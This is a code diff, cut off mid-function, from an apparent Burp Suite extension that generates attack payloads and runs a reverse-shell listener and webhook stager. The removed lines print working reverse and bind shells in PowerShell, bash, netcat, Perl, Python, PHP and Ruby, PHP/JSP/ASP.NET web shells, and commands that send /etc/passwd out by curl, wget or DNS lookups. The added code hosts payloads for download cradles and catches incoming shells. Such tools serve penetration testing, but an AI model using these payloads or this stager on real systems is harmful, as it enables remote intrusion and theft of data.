+        UITheme.styleComboBox(payloadTemplateCombo);
+        row2.add(payloadTemplateCombo, gbc);
+
+        // IP
+        gbc.gridx = 2; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel ipLabel = new JLabel("ATTACKER IP:");
+        ipLabel.setFont(UITheme.FONT_SUBTITLE);
+        ipLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row2.add(ipLabel, gbc);
+
+        gbc.gridx = 3; gbc.gridy = 0; gbc.weightx = 0.2;
+        payloadIpCombo = new JComboBox<>();
+        payloadIpCombo.setEditable(true);
+        UITheme.styleComboBox(payloadIpCombo);
+        populateIpAddresses(payloadIpCombo);
+        row2.add(payloadIpCombo, gbc);
+
+        // Port
+        gbc.gridx = 4; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel portLabel = new JLabel("PORT:");
+        portLabel.setFont(UITheme.FONT_SUBTITLE);
+        portLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row2.add(portLabel, gbc);
+
+        gbc.gridx = 5; gbc.gridy = 0; gbc.weightx = 0.1;
+        payloadPortField = new JTextField("4444", 6);
+        UITheme.styleTextField(payloadPortField);
+        row2.add(payloadPortField, gbc);
+
+        // Row 3: Advanced Parameters & Encoding
+        JPanel row3 = new JPanel(new GridBagLayout());
+        row3.setOpaque(false);
+
+        // Shell Binary
+        gbc.gridx = 0; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel shellLabel = new JLabel("SHELL BINARY:");
+        shellLabel.setFont(UITheme.FONT_SUBTITLE);
+        shellLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row3.add(shellLabel, gbc);
+
+        gbc.gridx = 1; gbc.gridy = 0; gbc.weightx = 0.2;
+        payloadShellField = new JTextField("/bin/bash", 12);
+        UITheme.styleTextField(payloadShellField);
+        row3.add(payloadShellField, gbc);
+
+        // Target File / Cmd
+        gbc.gridx = 2; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel fileLabel = new JLabel("TARGET FILE / CMD:");
+        fileLabel.setFont(UITheme.FONT_SUBTITLE);
+        fileLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row3.add(fileLabel, gbc);
+
+        gbc.gridx = 3; gbc.gridy = 0; gbc.weightx = 0.25;
+        payloadTargetFileField = new JTextField("/etc/passwd", 14);
+        UITheme.styleTextField(payloadTargetFileField);
+        row3.add(payloadTargetFileField, gbc);
+
+        // Encoding
+        gbc.gridx = 4; gbc.gridy = 0; gbc.weightx = 0.0;
+        JLabel encLabel = new JLabel("ENCODING:");
+        encLabel.setFont(UITheme.FONT_SUBTITLE);
+        encLabel.setForeground(UITheme.TEXT_SECONDARY);
+        row3.add(encLabel, gbc);
+
+        gbc.gridx = 5; gbc.gridy = 0; gbc.weightx = 0.25;
+        payloadEncodingCombo = new JComboBox<>(EncodingType.values());
+        UITheme.styleComboBox(payloadEncodingCombo);
+        row3.add(payloadEncodingCombo, gbc);
+
+        // Row 4: Action Buttons
+        JPanel row4 = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 4));
+        row4.setOpaque(false);
+
+        ModernButton autoFillBtn = new ModernButton("AUTO-FILL FROM LISTENER", new Color(71, 85, 105));
+        ModernButton hostStagerBtn = new ModernButton("HOST AS STAGER ON WEBHOOK", new Color(13, 148, 136));
+        ModernButton generateBtn = new ModernButton("GENERATE PAYLOAD", UITheme.STATUS_SUCCESS);
+        ModernButton copyBtn = new ModernButton("COPY PAYLOAD", UITheme.STATUS_INFO);
+        ModernButton saveFileBtn = new ModernButton("SAVE TO FILE", new Color(100, 116, 139));
+
+        autoFillBtn.addActionListener(e -> autoFillFromListener());
+        hostStagerBtn.addActionListener(e -> hostCurrentPayloadOnWebhook());
+        generateBtn.addActionListener(e -> generateCurrentPayload());
+        copyBtn.addActionListener(e -> copyPayloadToClipboard());
+        saveFileBtn.addActionListener(e -> savePayloadToFile());
+
+        row4.add(autoFillBtn);
+        row4.add(hostStagerBtn);
+        row4.add(generateBtn);
+        row4.add(copyBtn);
+        row4.add(saveFileBtn);
+
+        controlsCard.add(row1, BorderLayout.NORTH);
+        controlsCard.add(row2, BorderLayout.CENTER);
+
+        JPanel bottomControls = new JPanel(new BorderLayout(0, 4));
+        bottomControls.setOpaque(false);
+        bottomControls.add(row3, BorderLayout.NORTH);
+        bottomControls.add(row4, BorderLayout.SOUTH);
+        controlsCard.add(bottomControls, BorderLayout.SOUTH);
+
+        panel.add(controlsCard, BorderLayout.NORTH);
+
+        // Center: Native Burp Text Editor
+        payloadEditor = callbacks.createTextEditor();
+        payloadEditor.setEditable(false);
+        callbacks.customizeUiComponent(payloadEditor.getComponent());
+
+        JPanel editorContainer = new JPanel(new BorderLayout());
+        editorContainer.setBorder(new CompoundBorder(
+                new TitledBorder(new LineBorder(UITheme.BORDER_LIGHT, 1), "GENERATED PAYLOAD", TitledBorder.LEFT, TitledBorder.TOP, UITheme.FONT_SUBTITLE, UITheme.TEXT_SECONDARY),
+                new EmptyBorder(4, 4, 4, 4)
+        ));
+        editorContainer.setBackground(UITheme.CARD_BG);
+        editorContainer.add(payloadEditor.getComponent(), BorderLayout.CENTER);
+
+        // Description Box
+        payloadDescriptionArea = new JTextArea(3, 40);
+        payloadDescriptionArea.setFont(UITheme.FONT_SMALL);
+        payloadDescriptionArea.setEditable(false);
+        payloadDescriptionArea.setLineWrap(true);
+        payloadDescriptionArea.setWrapStyleWord(true);
+        payloadDescriptionArea.setBackground(UITheme.CARD_HEADER_BG);
+        payloadDescriptionArea.setForeground(UITheme.TEXT_SECONDARY);
+        payloadDescriptionArea.setBorder(new EmptyBorder(6, 10, 6, 10));
+
+        JPanel descWrapper = new JPanel(new BorderLayout());
+        descWrapper.setBorder(new CompoundBorder(
+                new TitledBorder(new LineBorder(UITheme.BORDER_LIGHT, 1), "TEMPLATE DETAILS & PREREQUISITES", TitledBorder.LEFT, TitledBorder.TOP, UITheme.FONT_SUBTITLE, UITheme.TEXT_SECONDARY),
+                new EmptyBorder(2, 4, 4, 4)
+        ));
+        descWrapper.setBackground(UITheme.CARD_BG);
+        descWrapper.add(payloadDescriptionArea, BorderLayout.CENTER);
+
+        JSplitPane payloadSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, editorContainer, descWrapper);
+        payloadSplit.setResizeWeight(0.8);
+        payloadSplit.setDividerSize(6);
+        payloadSplit.setBorder(null);
+
+        panel.add(payloadSplit, BorderLayout.CENTER);
+
+        // Event Listeners
+        javax.swing.Timer payloadSearchTimer = new javax.swing.Timer(150, evt -> filterTemplates());
+        payloadSearchTimer.setRepeats(false);
+
+        payloadSearchField.getDocument().addDocumentListener(new DocumentListener() {
+            @Override public void insertUpdate(DocumentEvent e) { payloadSearchTimer.restart(); }
+            @Override public void removeUpdate(DocumentEvent e) { payloadSearchTimer.restart(); }
+            @Override public void changedUpdate(DocumentEvent e) { payloadSearchTimer.restart(); }
+        });
+
+        payloadCategoryCombo.addActionListener(e -> filterTemplates());
+        payloadOsCombo.addActionListener(e -> filterTemplates());
+        payloadTemplateCombo.addActionListener(e -> {
+            updateTemplateMetadata();
+            generateCurrentPayload();
+        });
+
+        filterTemplates();
+        return panel;
+    }
+
+    private void filterTemplates() {
+        String query = payloadSearchField != null ? payloadSearchField.getText().trim().toLowerCase() : "";
+        String selectedCat = payloadCategoryCombo != null ? (String) payloadCategoryCombo.getSelectedItem() : "All Categories";
+        String selectedOs = payloadOsCombo != null ? (String) payloadOsCombo.getSelectedItem() : "All Platforms";
+
+        DefaultComboBoxModel<PayloadTemplate> model = new DefaultComboBoxModel<>();
+        List<PayloadTemplate> all = PayloadRegistry.getAllTemplates();
+
+        for (PayloadTemplate t : all) {
+            boolean matchCat = "All Categories".equals(selectedCat) || t.getCategory().getDisplayName().equalsIgnoreCase(selectedCat);
+            boolean matchOs = "All Platforms".equals(selectedOs) || t.getTargetOS().equalsIgnoreCase(selectedOs);
+            boolean matchQuery = query.isEmpty() ||
+                    t.getName().toLowerCase().contains(query) ||
+                    t.getDescription().toLowerCase().contains(query) ||
+                    t.getTargetOS().toLowerCase().contains(query);
+
+            if (matchCat && matchOs && matchQuery) {
+                model.addElement(t);
             }
         }
 
-        String rawPayload = getPayloadString();
-        String encoding = (String) encodingCombo.getSelectedItem();
-        String finalPayload = rawPayload;
+        if (payloadTemplateCombo != null) {
+            payloadTemplateCombo.setModel(model);
+            if (model.getSize() > 0) {
+                payloadTemplateCombo.setSelectedIndex(0);
+            }
+            updateTemplateMetadata();
+            generateCurrentPayload();
+        }
+    }
 
+    private void updateTemplateMetadata() {
+        PayloadTemplate template = (PayloadTemplate) payloadTemplateCombo.getSelectedItem();
+        if (template == null) {
+            payloadDescriptionArea.setText("No template selected.");
+            return;
+        }
+
+        StringBuilder sb = new StringBuilder();
+        sb.append(template.getName()).append(" [").append(template.getTargetOS()).append("] - ")
+                .append(template.getCategory().getDisplayName()).append("\n");
+        sb.append("Description: ").append(template.getDescription()).append("\n");
+        sb.append("Parameters: IP Required: ").append(template.isRequiresIp() ? "Yes" : "No")
+                .append(" | Port Required: ").append(template.isRequiresPort() ? "Yes" : "No")
+                .append(" | Shell Binary: ").append(template.isRequiresShellPath() ? "Yes" : "No")
+                .append(" | Target File: ").append(template.isRequiresFileOrCmd() ? "Yes" : "No");
+
+        payloadDescriptionArea.setText(sb.toString());
+        payloadShellField.setEnabled(template.isRequiresShellPath());
+        payloadTargetFileField.setEnabled(template.isRequiresFileOrCmd());
+    }
+
+    private void generateCurrentPayload() {
+        PayloadTemplate template = (PayloadTemplate) payloadTemplateCombo.getSelectedItem();
+        if (template == null) {
+            payloadEditor.setText(new byte[0]);
+            return;
+        }
+
+        String ip = payloadIpCombo.getSelectedItem() != null ? ((String) payloadIpCombo.getSelectedItem()).trim() : "127.0.0.1";
+        int port = 4444;
         try {
-            switch (encoding) {
-                case "Base64":
-                    // For shells, you often need to wrap the base64 string
-                    if ("Reverse/Bind Shell".equals(payloadCategoryCombo.getSelectedItem())) {
-                        finalPayload = "echo " + Base64.getEncoder().encodeToString(rawPayload.getBytes())
-                                + " | base64 -d | sh";
-                    } else {
-                        finalPayload = Base64.getEncoder().encodeToString(rawPayload.getBytes());
-                    }
-                    break;
-                case "URL":
-                    finalPayload = URLEncoder.encode(rawPayload, StandardCharsets.UTF_8.toString());
-                    break;
-            }
-        } catch (UnsupportedEncodingException e) {
-            // This should not happen with UTF-8
-            callbacks.printError("Error during URL encoding: " + e.getMessage());
-        }
+            port = Integer.parseInt(payloadPortField.getText().trim());
+        } catch (NumberFormatException ignored) {}
 
-        payloadEditor.setText(finalPayload.getBytes(StandardCharsets.UTF_8));
+        String shellPath = payloadShellField.getText().trim();
+        String targetFile = payloadTargetFileField.getText().trim();
+        String customCmd = "whoami";
+
+        PayloadParams params = new PayloadParams(ip, port, shellPath, targetFile, customCmd);
+        String rawPayload = template.generate(params);
+
+        EncodingType encoding = (EncodingType) payloadEncodingCombo.getSelectedItem();
+        if (encoding == null) encoding = EncodingType.RAW;
+
+        String encodedPayload = PayloadEncoder.encode(rawPayload, encoding);
+        payloadEditor.setText(encodedPayload.getBytes(StandardCharsets.UTF_8));
     }
 
-    private String getPayloadString() {
-        String category = (String) payloadCategoryCombo.getSelectedItem();
-        String template = (String) payloadTemplateCombo.getSelectedItem();
-        String os = (String) osCombo.getSelectedItem();
-        String shellType = (String) shellTypeCombo.getSelectedItem();
-        String ip = ((String) ipCombo.getSelectedItem()).trim();
-        int port = Integer.parseInt(payloadPortField.getText().trim());
-
-        if ("Reverse/Bind Shell".equals(category)) {
-            return getShellPayload(template, os, shellType, ip, port);
-        } else if ("Web Shell".equals(category)) {
-            return getWebShellPayload(template);
-        } else if ("Data Exfiltration".equals(category)) {
-            return getDataExfilPayload(template, ip, port);
+    private void autoFillFromListener() {
+        if (isListening && currentPort != -1) {
+            payloadPortField.setText(String.valueOf(currentPort));
+            if (payloadIpCombo.getItemCount() > 0) {
+                payloadIpCombo.setSelectedIndex(payloadIpCombo.getItemCount() > 1 ? 1 : 0);
+            }
+            generateCurrentPayload();
+            JOptionPane.showMessageDialog(this, "Auto-filled listener IP and Port: " + currentPort, "Listener Sync", JOptionPane.INFORMATION_MESSAGE);
+        } else {
+            JOptionPane.showMessageDialog(this, "Listener is not currently active.", "Listener Offline", JOptionPane.WARNING_MESSAGE);
         }
-        return "Invalid selection.";
     }
 
-    private String getShellPayload(String template, String os, String type, String ip, int port) {
-        boolean isReverse = "Reverse".equals(type);
-        if ("Windows".equals(os)) {
-            switch (template) {
-                case "Powershell #1":
-                    return isReverse ? "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port
-                            + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-                            : "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0'," + port
-                                    + ");$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()";
-                case "Powershell #2 (TLS)":
-                    return isReverse
-                            ? "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $tcpClient = New-Object System.Net.Sockets.TcpClient('"
-                                    + ip + "', " + port
-                                    + "); $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream(), $false, { $true }); $sslStream.AuthenticateAsClient('"
-                                    + ip
-                                    + "', $null, $sslProtocols, $false); $writer = New-Object System.IO.StreamWriter($sslStream); $writer.AutoFlush = $true; $reader = New-Object System.IO.StreamReader($sslStream); $buffer = New-Object byte[] 1024; while ($tcpClient.Connected) { $writer.Write('PS> '); $command = $reader.ReadLine(); if ($null -eq $command) { break } $output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_ | Out-String }; $writer.Write($output) }; $writer.Close(); $reader.Close(); $sslStream.Close(); $tcpClient.Close()"
-                            : "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2( (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2), 'password'); $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, "
-                                    + port
-                                    + "); $listener.Start(); $client = $listener.AcceptTcpClient(); $sslStream = [System.Net.Security.SslStream]::new($client.GetStream(), $false); $sslStream.AuthenticateAsServer($cert, $false, 'Tls12', $false); $reader = [System.IO.StreamReader]::new($sslStream); $writer = [System.IO.StreamWriter]::new($sslStream); $writer.AutoFlush = $true; while ($client.Connected) { $writer.Write('PS> '); $cmd = $reader.ReadLine(); if ($null -eq $cmd) { break }; $output = try { iex $cmd 2>&1 | Out-String } catch { $_ | Out-String }; $writer.Write($output) }; $writer.Close(); $reader.Close(); $sslStream.Close(); $client.Close(); $listener.Stop()";
-                case "Netcat":
-                    return isReverse ? "nc.exe -e cmd.exe " + ip + " " + port : "nc.exe -l -p " + port + " -e cmd.exe";
-                case "C#":
-                    return isReverse
-                            ? "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\rev.exe C:\\Users\\Public\\rev.cs && C:\\Users\\Public\\rev.exe"
-                            : "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\bind.exe C:\\Users\\Public\\bind.cs && C:\\Users\\Public\\bind.exe";
-                default:
-                    return "Template not implemented.";
+    private void hostCurrentPayloadOnWebhook() {
+        byte[] bytes = payloadEditor.getText();
+        if (bytes == null || bytes.length == 0) {
+            JOptionPane.showMessageDialog(this, "Please generate a payload first.", "Empty Payload", JOptionPane.WARNING_MESSAGE);
+            return;
+        }
+
+        String payloadStr = new String(bytes, StandardCharsets.UTF_8);
+        PayloadTemplate tpl = (PayloadTemplate) payloadTemplateCombo.getSelectedItem();
+        String filename = "payload";
+        if (tpl != null) {
+            if (tpl.getTargetOS().contains("Windows")) {
+                filename = "rev.ps1";
+            } else if (tpl.getTargetOS().contains("Linux")) {
+                filename = "shell.sh";
             }
-        } else { // Linux/macOS
-            switch (template) {
-                case "Bash TCP":
-                    return isReverse ? "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
-                            : "mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc -lvp " + port + " > /tmp/p";
-                case "Bash UDP":
-                    return isReverse ? "sh -i >& /dev/udp/" + ip + "/" + port + " 0>&1"
-                            : "Not practical for bind shell.";
-                case "Netcat (with -e)":
-                    return isReverse ? "nc -e /bin/bash " + ip + " " + port : "nc -lvp " + port + " -e /bin/bash";
-                case "Netcat (mkfifo)":
-                    return isReverse
-                            ? "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc " + ip + " " + port
-                                    + " > /tmp/f"
-                            : "nc -lvp " + port + " 0< /tmp/f | /bin/sh 1> /tmp/f";
-                case "Perl":
-                    return isReverse ? "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port
-                            + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
-                            : "perl -e 'use Socket;$p=" + port
-                                    + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);for(;accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");}'";
-                case "Python3":
-                    return isReverse
-                            ? "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""
-                                    + ip + "\"," + port
-                                    + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
-                            : "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\","
-                                    + port
-                                    + "));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
-                case "PHP":
-                    return isReverse
-                            ? "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
-                            : "php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($sock,\"0.0.0.0\","
-                                    + port
-                                    + ");socket_listen($sock,1);$client=socket_accept($sock);while(1){$r=array($client);$w=NULL;$e=NULL;if(socket_select($r,$w,$e,NULL)){$input=socket_read($client,1024);$output=shell_exec($input);socket_write($client,$output);}};'";
-                case "Ruby":
-                    return isReverse
-                            ? "ruby -rsocket -e 'f=TCPSocket.open(\"" + ip + "\"," + port
-                                    + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-                            : "ruby -rsocket -e 's=TCPServer.new(" + port
-                                    + ");c=s.accept;while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
-                case "Java":
-                    return isReverse ? "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"
-                            + ip + "/" + port
-                            + ";cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
-                            : "Template not implemented.";
-                default:
-                    return "Template not implemented.";
+        }
+
+        webhookConfig.autoHostPayload(payloadStr, filename);
+        String activeIp = payloadIpCombo.getSelectedItem() != null ? (String) payloadIpCombo.getSelectedItem() : "127.0.0.1";
+        int activePort = currentPort != -1 ? currentPort : 8080;
+
+        String endpointMsg = "Payload successfully hosted on Webhook Listener!\n\n" +
+                "Endpoints available:\n" +
+                "- http://" + activeIp + ":" + activePort + "/payload\n" +
+                "- http://" + activeIp + ":" + activePort + "/" + filename + "\n\n" +
+                "Download cradles (e.g. IEX / curl) can now fetch this script directly.";
+
+        JOptionPane.showMessageDialog(this, endpointMsg, "Stager Published", JOptionPane.INFORMATION_MESSAGE);
+    }
+
+    private void copyPayloadToClipboard() {
+        byte[] bytes = payloadEditor.getText();
+        if (bytes != null && bytes.length > 0) {
+            String text = new String(bytes, StandardCharsets.UTF_8);
+            StringSelection sel = new StringSelection(text);
+            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, null);
+            JOptionPane.showMessageDialog(this, "Payload successfully copied to clipboard.", "Copied", JOptionPane.INFORMATION_MESSAGE);
+        }
+    }
+
+    private void savePayloadToFile() {
+        byte[] bytes = payloadEditor.getText();
+        if (bytes == null || bytes.length == 0) return;
+
+        JFileChooser fileChooser = new JFileChooser();
+        fileChooser.setDialogTitle("Save Generated Payload");
+        if (fileChooser.showSaveDialog(this) == JFileChooser.APPROVE_OPTION) {
+            File file = fileChooser.getSelectedFile();
+            try (FileOutputStream fos = new FileOutputStream(file)) {
+                fos.write(bytes);
+                JOptionPane.showMessageDialog(this, "Payload saved successfully to: " + file.getAbsolutePath(), "File Saved", JOptionPane.INFORMATION_MESSAGE);
+            } catch (IOException e) {
+                JOptionPane.showMessageDialog(this, "Error saving file: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
             }
         }
     }
 
-    private String getWebShellPayload(String template) {
-        switch (template) {
-            case "PHP Simple Command Shell":
-                return "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>";
-            case "PHP Full-featured Shell":
-                return "<?php set_time_limit(0); error_reporting(0); if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value); } } echo '<!DOCTYPE HTML><html><head><title>Simple PHP Shell</title></head><body><form method=\"post\">_cmd: <input type=\"text\" name=\"cmd\" size=\"80\"><input type=\"submit\" value=\"Execute\"></form><hr><pre>'; if(isset($_POST['cmd'])){ system($_POST['cmd']); } echo '</pre></body></html>';?>";
-            case "JSP Simple Command Shell":
-                return "<%@ page import=\"java.util.*,java.io.*\"%><% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>";
-            case "ASP.NET Simple Command Shell":
-                return "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"false\" %><%@ Import Namespace=\"System.Diagnostics\" %><%@ Import Namespace=\"System.IO\" %><script Language=\"c#\" runat=\"server\">void Page_Load(object sender, EventArgs e){}</script><HTML><body ><form id=\"form1\" runat=\"server\"><input type=\"text\" name=\"cmd\" /><input type=\"submit\" value=\"Run\" /></form><% Response.Write(\"<pre>\"); if (Request.Form[\"cmd\"] != null){Process p = new Process();p.StartInfo.FileName = \"cmd.exe\";p.StartInfo.Arguments = \"/c \" + Request.Form[\"cmd\"];p.StartInfo.RedirectStandardOutput = true;p.StartInfo.UseShellExecute = false;p.Start();string output = p.StandardOutput.ReadToEnd();p.WaitForExit();Response.Write(output);}Response.Write(\"</pre></body></HTML>\");";
-            default:
-                return "Template not implemented.";
-        }
-    }
-
-    private String getDataExfilPayload(String template, String ip, int port) {
-        String listenerUrl = "http://" + ip + ":" + port + "/";
-        switch (template) {
-            case "Curl (File Upload)":
-                return "curl -X POST --data-binary @/etc/passwd " + listenerUrl;
-            case "Wget (File Upload)":
-                return "wget --post-file=/etc/passwd " + listenerUrl;
-            case "DNS Exfil (nslookup)":
-                return "nslookup $(cat /etc/passwd | tr -d '\\n' | xxd -p -c 20).your-dns-collaborator.net";
-            default:
-                return "Template not implemented.";
-        }
-    }
-    // --- End of Payload Generator Logic ---
-
+    // =========================================================================
+    // LISTENER ENGINE & SOCKET HANDLING
+    // =========================================================================
     private void startListener() {
         try {
             int port = Integer.parseInt(portField.getText().trim());
             if (port < 1 || port > 65535) {
-                JOptionPane.showMessageDialog(this, "Please enter a valid port (1-65535).", "Invalid Port",
-                        JOptionPane.ERROR_MESSAGE);
+                JOptionPane.showMessageDialog(this, "Port must be between 1 and 65535.", "Invalid Port", JOptionPane.ERROR_MESSAGE);
                 return;
             }
 
             currentPort = port;
             String mode = (String) modeCombo.getSelectedItem();
-
-            // Update UI based on mode (safe: on EDT)
-            CardLayout cl = (CardLayout) (modePanel.getLayout());
-            if ("Reverse Shell".equals(mode)) {
-                cl.show(modePanel, SHELL_CARD);
-                shellDisplayPane.setText("Waiting for reverse shell connection on port " + port + "...\n");
-                bottomPanel.setVisible(true);
-            } else {
-                cl.show(modePanel, WEBHOOK_CARD);
-                bottomPanel.setVisible(false);
-            }
+            boolean useTls = tlsCheckBox.isSelected();
 
             startButton.setEnabled(false);
             stopButton.setEnabled(true);
             portField.setEnabled(false);
             modeCombo.setEnabled(false);
+            tlsCheckBox.setEnabled(false);
             isListening = true;
 
-            // NetworkInterface.getNetworkInterfaces() is blocking I/O — run in background thread
+            CardLayout cl = (CardLayout) modeCardsPanel.getLayout();
+            if ("Reverse Shell".equals(mode)) {
+                cl.show(modeCardsPanel, CARD_SHELL);
+                shellStatusLabel.setText("STATUS: LISTENING ON PORT " + port + (useTls ? " (TLS/SSL)" : ""));
+            } else {
+                cl.show(modeCardsPanel, CARD_WEBHOOK);
+            }
+
             listenerThread = new Thread(() -> {
                 List<String> ipAddresses = getAvailableIpAddresses();
-                if (ipAddresses.isEmpty()) {
-                    callbacks.printError("No non-loopback IP addresses found.");
-                }
-                String ipDisplay = ipAddresses.isEmpty()
-                        ? "127.0.0.1 (localhost only)"
-                        : String.join(", ", ipAddresses);
-                final boolean hasIps = !ipAddresses.isEmpty();
                 SwingUtilities.invokeLater(() -> {
                     statusField.setText("ONLINE");
-                    statusField.setBackground(new Color(39, 174, 96));
-                    statusField.setForeground(Color.WHITE);
-                    updateIpDisplay(ipAddresses, port);
-                    vpnWarningLabel.setText("Click any IP:port above to copy.");
+                    statusField.setBackground(UITheme.STATUS_SUCCESS);
+                    updateIpDisplay(ipAddresses, port, mode, useTls);
+                    vpnWarningLabel.setText(useTls ? "TLS Active - Click address to copy HTTPS URL." : "Click any address chip to copy.");
                 });
-                runListener(port, mode);
+                runListenerLoop(port, mode, useTls);
             });
             listenerThread.start();
 
         } catch (NumberFormatException e) {
-            JOptionPane.showMessageDialog(this, "Please enter a valid port number.", "Invalid Port",
-                    JOptionPane.ERROR_MESSAGE);
+            JOptionPane.showMessageDialog(this, "Please enter a valid numeric port.", "Invalid Port", JOptionPane.ERROR_MESSAGE);
         }
     }
 
+    private void runListenerLoop(int port, String mode, boolean useTls) {
+        try {
+            if (useTls) {
+                serverSocket = TlsSocketHelper.createTlsServerSocket(port, 50, InetAddress.getByName("0.0.0.0"), callbacks);
+                callbacks.printOutput("TLS/SSL Listener started on port " + port + " in mode: " + mode);
+            } else {
+                serverSocket = new ServerSocket(port, 50, InetAddress.getByName("0.0.0.0"));
+                callbacks.printOutput("Plain TCP Listener started on port " + port + " in mode: " + mode);
+            }
+
+            while (isListening) {
+                if ("Reverse Shell".equals(mode)) {
+                    try {
+                        Socket client = serverSocket.accept();
+                        sessionManager.registerNewSession(client);
+                    } catch (IOException e) {
+                        if (isListening) {
+                            callbacks.printError("Reverse shell accept error: " + e.getMessage());
+                        }
+                    }
+                } else {
+                    // HTTP Webhook Mode
+                    try (Socket client = serverSocket.accept()) {
+                        handleWebhookRequest(client, port);
+                    } catch (IOException e) {
+                        if (isListening) {
+                            callbacks.printError("Webhook request error: " + e.getMessage());
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            if (isListening) {
+                callbacks.printError("Listener socket error: " + e.getMessage());
+                SwingUtilities.invokeLater(() -> {
+                    JOptionPane.showMessageDialog(this, "Failed to bind to port " + port + ": " + e.getMessage(), "Listener Error", JOptionPane.ERROR_MESSAGE);
+                    stopListener();
+                });
+            }
+        } finally {
+            if (serverSocket != null && !serverSocket.isClosed()) {
+                try { serverSocket.close(); } catch (IOException ignored) {}
+            }
+        }
+    }
+
+    private void handleWebhookRequest(Socket client, int port) throws IOException {
+        BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
+        StringBuilder reqBuilder = new StringBuilder();
+        String line;
+        String method = "GET";
+        String path = "/";
+        String hostHeader = "localhost";
+        int contentLength = 0;
+
+        while ((line = reader.readLine()) != null && !line.isEmpty()) {
+            reqBuilder.append(line).append("\n");
+            if (line.contains(" HTTP/")) {
+                String[] parts = line.split(" ");
+                if (parts.length >= 2) {
+                    method = parts[0];
+                    path = parts[1];
+                }
+            }
+            if (line.toLowerCase().startsWith("content-length:")) {
+                try {
+                    contentLength = Integer.parseInt(line.substring(line.indexOf(":") + 1).trim());
+                    if (contentLength > 10 * 1024 * 1024) contentLength = 10 * 1024 * 1024;
+                } catch (NumberFormatException ignored) {}
+            }
+            if (line.toLowerCase().startsWith("host:")) {
+                hostHeader = line.substring(5).trim();
